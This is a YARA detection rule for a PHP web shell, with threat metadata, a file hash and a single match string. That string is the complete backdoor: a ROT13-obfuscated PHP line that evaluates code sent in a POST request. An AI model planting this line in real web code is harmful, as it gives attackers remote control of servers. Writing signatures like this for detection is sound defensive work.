rule WebShell_BackDoor_Unlimit_Webshell_Getpostphp_A_1586 {
  meta:
    author = "Spider"
    comment = "None"
    date = "2014/03/28"
    description = "Web shells - generated from file GetPostpHp.php"
    family = "Webshell"
    hacker = "None"
    hash = "20ede5b8182d952728d594e6f2bb5c76"
    judge = "unknown"
    reference = "None"
    score = 70
    threatname = "WebShell[BackDoor]/Unlimit.Webshell.Getpostphp.A"
    threattype = "BackDoor"
  strings:
    $s0 = "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>" fullword
  condition:
    all of them
}